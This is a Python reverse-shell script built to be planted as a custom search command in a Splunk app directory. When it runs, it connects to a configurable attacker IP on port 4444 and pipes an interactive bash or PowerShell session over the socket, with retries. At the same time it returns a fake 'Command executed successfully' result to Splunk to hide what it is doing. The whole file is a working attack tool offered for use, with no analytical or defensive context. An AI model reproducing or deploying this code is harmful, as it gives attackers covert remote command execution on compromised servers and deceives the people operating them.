# File: reverse_shell.py (to be placed in $SPLUNK_HOME/etc/apps/search/bin/)

import splunk.Intersplunk
import subprocess
import socket
import threading
import os,sys,re
import platform
import time

# Configuration
ATTACKER_IP = "YOUR_IP"
ATTACKER_PORT = 4444
RETRY_DELAY = 5  # seconds between connection attempts
MAX_RETRIES = 5

def log_message(message):
    with open("/tmp/splunk_shell.log", "a") as f:
        f.write(f"{time.ctime()}: {message}\n")

def create_reverse_shell():
    # Platform detection
    system = platform.system().lower()
    
    # Connection retry logic
    retries = 0
    while retries < MAX_RETRIES:
        try:
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            
            # Platform-specific handling
            if "windows" in system:
                # Windows-specific reverse shell
                p = subprocess.Popen(["powershell.exe"], 
                                    stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT,
                                    shell=True,
                                    text=True)
                
                # Communication handling thread functions
                def send_data():
                    while True:
                        data = p.stdout.readline()
                        if not data:
                            break
                        s.sendall(data.encode())
                
                def receive_data():
                    while True:
                        data = s.recv(1024).decode()
                        if not data:
                            break
                        p.stdin.write(data)
                        p.stdin.flush()
            
            else:
                # Linux/Unix reverse shell
                if hasattr(os, 'posix_spawn'):
                    # Modern method using posix_spawn
                    p = subprocess.Popen(["/bin/bash", "-i"], 
                                        stdin=subprocess.PIPE,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE)
                else:
                    # Fallback method
                    p = subprocess.Popen(["/bin/bash", "-i"], 
                                        stdin=subprocess.PIPE,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        shell=True)
                
                # Communication handling thread functions
                def send_data():
                    while True:
                        # Combine stdout and stderr
                        data = p.stdout.read(1)
                        if not data:
                            stderr_data = p.stderr.read(1024)
                            if stderr_data:
                                s.sendall(stderr_data)
                            else:
                                break
                        else:
                            s.sendall(data)
                
                def receive_data():
                    while True:
                        data = s.recv(1024)
                        if not data:
                            break
                        p.stdin.write(data)
                        p.stdin.flush()
            
            # Start communication threads
            threading.Thread(target=send_data, daemon=True).start()
            threading.Thread(target=receive_data, daemon=True).start()
            
            # Keep main thread alive
            while True:
                time.sleep(60)
                
        except Exception as e:
            log_message(f"Connection failed: {str(e)}")
            retries += 1
            time.sleep(RETRY_DELAY)
            
def main():
    try:
        # Start reverse shell in background thread
        threading.Thread(target=create_reverse_shell, daemon=True).start()
        
        # Return dummy results to Splunk
        results = []
        results.append({"message": "Command executed successfully"})
        splunk.Intersplunk.outputResults(results)
        
    except Exception as e:
        # Handle any exceptions
        log_message(f"Error in main: {str(e)}")
        results = []
        results.append({"error": "Error executing command"})
        splunk.Intersplunk.outputResults(results)

if __name__ == "__main__":
    main()
